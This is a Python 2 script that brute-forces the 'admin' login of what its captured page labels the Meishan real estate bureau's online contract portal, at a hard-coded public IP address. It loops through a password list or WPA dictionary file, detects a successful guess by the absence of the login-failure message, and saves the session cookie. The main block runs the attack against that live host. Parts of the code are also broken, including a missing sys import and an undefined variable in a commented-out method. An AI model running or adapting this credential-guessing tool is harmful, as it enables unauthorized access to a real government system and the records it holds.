#!/usr/bin/python
#coding=utf-8
#filename:web_auth_cookie_fcxx.py
''' program start 286 line.
20130715-2050 http://218.89.119.149:9080/fcxx/index.do
----------提交时的Headers--------------------------
(Request-Line)	POST /fcxx/userLogin.do HTTP/1.1
Host	218.89.119.149:9080
User-Agent	Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0
Accept	text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language	zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding	gzip, deflate
Connection	keep-alive
Referer	http://218.89.119.149:9080/fcxx/index.do
Cookie	style=default; id=1; JSESSIONID=0000U5UaHGxYr6z0vgjXadjV-ol:-1
Content-Type	application/x-www-form-urlencoded
Content-Length	37
-------提交时的POST数据-----------------
userName	aaa111bbb
password	aaa111bbb
-----------------------------返回的Content----
<?xml version="1.0" encoding="GB18030" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<base href="http://218.89.119.149:9080/fcxx/"/>
<script src="js/js4cnltreemenu.js" type="text/javascript"></script>
<script src="js/styleswitcher.js" type="text/javascript"></script>
<SCRIPT type="text/javascript" src="js/IDCard.js"></SCRIPT>
<script type="text/javascript" src="js/DateEditor.js"></script>
<script src="includes/JavascriptLib.js" type="text/javascript"></script>
<script src="includes/Hshtable.js" type="text/javascript"></script>
<script src="includes/DatePicker.js" type="text/javascript"></script>
<script src="includes/ArrayList.js" type="text/javascript"></script>
<script src="includes/PresellContrace.js" type="text/javascript"></script>
<script src="ajaxlib/prototype.js" language="JavaScript" type="text/javascript"></script>
<meta http-equiv="Content-Type" content="text/html; charset=GBK" />
<meta http-equiv="Content-Style-Type" content="text/css" />
<link rel="icon" href="images/favicon.ico" type="image/x-icon" />
<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="theme/style-screen-green.css" title="default"/>
<link rel="alternate stylesheet" type="text/css" href="theme/style-screen-blue.css" title="blue" />
<link rel="alternate stylesheet" type="text/css" href="theme/style-screen-yellow.css" title="yellow" />
<link rel="alternate stylesheet" type="text/css" href="theme/style-screen-gray.css" title="gray" />
<link rel="stylesheet" media="print" type="text/css" href="theme/style-print-contract.css" />


<title>眉山市房地产管理局-提示信息</title>

</head>
<body>
<noscript><iframe src=* width=0 height=0></iframe></noscript>
<div class="pagecenter">

<table id="header" summary="网页头">
	<tr>
		<td id="home">
		<div id="logo"><a href="index.do">&nbsp;</a></div>
		<ul class="mystyles" id="choosestyle">
		<li><img src="images/style16.gif" />风格设置
			<ul>
				<li><a href="javascript:;"	onclick="setActiveStyleSheet('default'); return false;">缺省风格</a></li>
				<li><a href="javascript:;" onclick="setActiveStyleSheet('blue'); return false;">蓝色之路</a></li>
				<li><a href="javascript:;" onclick="setActiveStyleSheet('yellow'); return false;">黄色森林</a></li>
				<li id="bottom"><a href="javascript:;" onclick="setActiveStyleSheet('gray'); return false;">灰色城市</a></li>
			</ul>
			</li>
		</ul>
		<a href="noservice.html"><img src="images/globe.gif" />关于我们</a>
		<a href="noservice.html"><img src="images/pen16.gif" />联系我们</a>
		
		</td>
	</tr>
	<tr>
		<td></td>
	</tr>
	<tr>
		<td id="nav1">
		<!--<a href="index.do">首页</a><a href="spf.do">商品房</a><a href="esf.do">二手房</a><a href="xjf.do">限价房</a>--><!--<a href="viewStaticModul.do?moduleName=房产动态">房产动态</a>-->
		<a href="index.do">首页</a><a href="spf.do">商品房</a>
		</td>
	</tr>
	<tr>
		<td id="welcome">今天是
		<script type="text/javascript">
<!--
var now = new Date();
var yr  = now.getYear();
var mn  = now.getMonth() + 1;
var dt  = now.getDate();
var dy  = now.getDay();

var fyr = (yr < 1900) ? 1900 + yr : yr;

var dys = new _Days();
var dyj = dys[dy];

document.write(fyr + "年" + mn + "月" + dt + "日" + " (" + dyj + ")");
//-->
</script>

		，欢迎使用本网站！</td>
	</tr>
</table>

	
</div>
<div class="pagecenter">
<table id="content" summary="正文区">
	<tr>
		<!--菜单区域开始-->
		<td id="sidebar">
		<div id="sbback">
		<div id="sbborder">
		
<script language="javascript">
var issuerDN = "O=成都房地产信息中心, OU=成都房管CA管理中心, CN=成都房地产信息中心用户CA";
var serialNumber = "";	


function CheckForm(formStr){
	var form=eval("document."+formStr);
	if(form.userName.value == "") {
		alert("请输入用户名。");
		form.userName.focus();
		return false;
	}
	if(form.password.value == "") {
		alert("请输入密码。");
		form.password.focus();
		return false;
	}
	
	form.submit();
}

</script>

<form name="LogonForm" method="post" action="userLogin.do" >
用户名：<input name="userName" Class="single"  size="16" /><br />
口　令：<input name="password" type="password" Class="single" size="16" />

<input type="button" value="确认" class="button" onclick="CheckForm('LogonForm');return false;"/> <input type="reset" value="恢复" onclick="reset();return false;" class="button">

</form>


		<div id="sidemenu">
		<div id="smtitle">
		<div id="smtext">会员功能菜单</div>
		<div id="smimg"><a id="AllOpen_1" href="javascript:;"
			onclick="MyCNLTreeMenu1.SetNodes(0);Hd(this);Sw('AllClose_1'); return false;"><img
			src="images/add1.gif" alt="全部展开" /></a><a id="AllClose_1" href="javascript:;"
			onclick="MyCNLTreeMenu1.SetNodes(1);Hd(this);Sw('AllOpen_1'); return false;"
			style="display: none"><img src="images/minus1.gif" alt="全部折叠" /></a></div>
		</div>



		<!--CNLTreeMenu Start:-->
		<div class="CNLTreeMenu" id="CNLTreeMenu1"><!--不用
<ul>
  <li class="Opened"><a href="http://www.iecn.net">系统功能菜单</a>
-->
		<ul>
			
			<li id="1">房地产开发企业
			<ul>
				<li>商品房网上签约
				<ul>
					<li class="Child"><a href="readSubscribeList.do">网上认购</a></li>
					<li class="Child"><a href="readPreContractList.do">拟定合同</a></li>
                                        <li class="Child"><a href="readContractList.do">已签约合同</a></li>					
					<li class="Child"><a href="queryContract.do?queryAction=query">所有合同列表</a></li>
					<li class="Child">签约统计
					<ul>
						<li class="Child"><a href="contractStatistic.do">合同统计</a>
						<li class="Child"><a href="houseStatistic.do">房屋统计</a>
					</ul>
					</li>
				</ul>
				</li>
				<li>公司管理
					<ul>
					<li class="Child"><a href="readWebUserList.do">销售人员申报</a></li>
<!--					<li class="Child"><a href="showUploadComImage.do">公司资料上传</a></li>  -->
					<li class="Child"><a href="readProjectLstByDev.do">项目资料上传</a></li>
					<!--<li class="Child"><a href="showLicencePage.do">项目价格申报</a></li>-->
					</ul>
				</li>
				
				<li>系统功能
				<ul>
					<li class="Child"><a href="showModifyPage.do">修改口令</a></li>
					<li class="Child"><a href="logout.do">注销</a></li>
				</ul>
				</li>
			</ul>
			</li>

		</ul>

		</div>
		<!-- CNLTreeMenu --> <!--CNLTreeMenu1 End!--> <script
			type="text/javascript">
<!--
var MyCNLTreeMenu1=new CNLTreeMenu("CNLTreeMenu1","li");
MyCNLTreeMenu1.InitCss("Opened","Closed","Child","images/s.gif");

-->
</script></div>
<DIV class="links">
		<DIV class="links-title">下载中心</DIV>
		<UL>
			<LI><A href="static/download/doc/contract.doc">合同下载</A></LI>
			<LI><A href="static/download/doc/subscribe.doc">认购书下载</A></LI>
			<LI><A href="static/download/doc/companydeclare.doc">开发企业申报表下载</A></LI>
			<LI><A href="static/download/doc/agentdeclare.doc">代理企业申报表下载</A></LI>
			<LI><A href="static/download/doc/salesdeclare.doc">从业人员申报表下载</A></LI>
			<LI><A href="static/download/doc/logoutdeclare.doc">注销备案申请表下载</A></LI>
			<LI><A href="static/download/doc/changedeclare.doc">更正备案信息申请表下载</A></LI>
			<LI><A href="static/download/doc/housetabletemplate.xls">楼盘表导入标准模板下载</A></LI>
			<LI><A href="static/download/doc/homeChecker.rar">楼盘表检测工具下载</A></LI>			
		</UL>
</DIV>
		
<script language="javascript">
<!--
	var issuerDN = "";
	var serialNumber = "";
	
//-->
</script>	
		</div>
		</div>
		</td>
		<td id="primarycontent">
		<div id="pcborder">

<div class="alert"><h2>提示信息</h2><div class="smallspacev"></div><p><font color="#ff0000"></font>用户登陆失败！
</p>
<div class="center smallspacev">
<a href="javascript:;" onclick="goBack();return false;"><img alt="" src="images/return.gif"/></a>
</div>
</div>
<script language="Javascript">
	function goBack(){
		history.go(-1);
	}
</script>

		
		</div>
		</td>
	</tr>
</table>
</div>
<div class="pagecenter">

<table id="footer" summary="网页脚"><tr><td><p>维护：眉山市房地产管理局 　联系电话：0833－8100309 8100442 　</p>
<p>Copyright　2002-2005 by 眉山市房地产管理局 all rights reserved 　版权所有未经许可不得转载 版权声明</p>
</td></tr></table>

</div>
</body></html>
--------------------------------------------------
    how_to_use:
    >>> from python.web_auth_cookie_fcxx import AuthCookie
    >>> from python.web_auth_cookie_fcxx import *
    >>> url11 = "http://218.89.119.149:9080/fcxx/userLogin.do"
    >>> file11 = "/tmp/cookie11.txt"
    >>> agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
    >>> pwd11 = ['aaa', 'bbb', 'ksksie','ssdssw','scbh001']
    >>> s11 = AuthCookie(agent11, file11, url11, 'admin')
    >>> method1: password from a list
    >>> s11resu = s11.crack(pwd11)
    >>>
    >>> method2: password from a file
    >>> file1 = open('pwd.txt')
    >>> file1pwd = iter(file1)
    >>> for pwdTmp in file1pwd:
    >>>        s11.crack2(pwdTmp.strip())
'''

import urllib
import urllib2
import cookielib
import time

class AuthCookie():
    def __init__(self, user_agent, cookie_file, url, username):
        self.client_headers = {'User-Agent':user_agent}
        self.cookiejar = cookielib.MozillaCookieJar(cookie_file)
        self.cookieproc = urllib2.HTTPCookieProcessor(self.cookiejar)
        self.opener = urllib2.build_opener(self.cookieproc)
        self.url = url
        self.user_crack = username

    def read_url(self, url=None):
        if url:
            self.url = url
        try:
            response = self.opener.open(self.url)
        except urllib2.HTTPError, e:
            print "at urllib2.urlopen, raise ERROR (", e, ")"
            return
        return response
    
    def crack(self, pwd_list):
        ''' pwd_list ==> ['111', '222', .....]
        req = urllib2.Request(url=arg1, headers=client_headers, data=pwd_encode) '''
        for key1 in pwd_list:
            pwd_encode = urllib.urlencode({
                    'userName': self.user_crack,
                    'password': key1,
                    })
            try:
                req = urllib2.Request(self.url, self.client_headers)
                self.response = self.opener.open(req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR", e
                sys.exit(-1)
            response_resu = self.response.getcode()
            print pwd_encode  #DEBUG
            print self.cookiejar  #DEBUG
            if response_resu == 200:
                self.response_html = self.response.read()
                # DEBUG
                # print self.response_html.decode('gbk').encode('utf-8').find('眉山')
                # 怎么样判断是通过验证，标志是***用户登陆失败***
                self.respon_uni = unicode(self.response_html, 'gbk')
                case = self.respon_uni.encode('utf-8').find('用户登陆失败')
                if case != -1:
                    pass   #password is error.
                else:
                    print time.ctime(), " Find The Key: ", key1
                    self.cookiejar.save()
                    return

    # def crack2(self, pwd):
    #     """
    #     pwd_list ==> '111'
    #     req = urllib2.Request(url=arg1, headers=client_headers, data=pwd_encode)
    #     """
    #     pwd_encode = urllib.urlencode({
    #             'userName': self.user_crack,
    #             'password': pwd,
    #             })
    #     try:
    #         response = self.opener.open(self.req, pwd_encode)
    #     except urllib2.HTTPError, e:
    #         print "at opener.open, raise ERROR", e
    #         return
    #     response_resu = response.getcode()
    #     if response_resu == 200:
    #         self.response_html = response.read()
    #         # 怎么样判断是通过验证，标志是***用户登陆失败***
    #         # self.response_html.decode('gbk')
    #         respon_uni = unicode(self.response_html, 'gbk')
    #         case = respon_uni.encode('utf-8').find('用户登陆失败')
    #         if case != -1:
    #             #print "false.....", key1
    #             return
    #         else:
    #             print time.ctime(), " Find The Key: ", key1
    #             self.cookiejar.save()
    #             print "good luck"
    #             exit(0) """
                
#ready to crack:
agent_t = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
file_t = "/tmp/cookie11.txt"
url_t = "http://218.89.119.149:9080/fcxx/userLogin.do"
url_t2 = "http://218.89.119.149:9080/fcxx/searchNeedModifyedContracts.do"
pwd_t = ['123', 'bbb', 'ksksie','ssdssw','scbh001']
pwd_file = "/mnt/sda7f/~1/tools/pwd_dict_wpa.txt"
#           /mnt/sda7f/~1/tools/pwd_dict_wpa.txt

if __name__ == "__main__":
    s11 = AuthCookie(agent_t, file_t, url_t, 'admin')
    pwd_f = open(pwd_file)
    s11.crack(pwd_f)
    # print s11.response_html
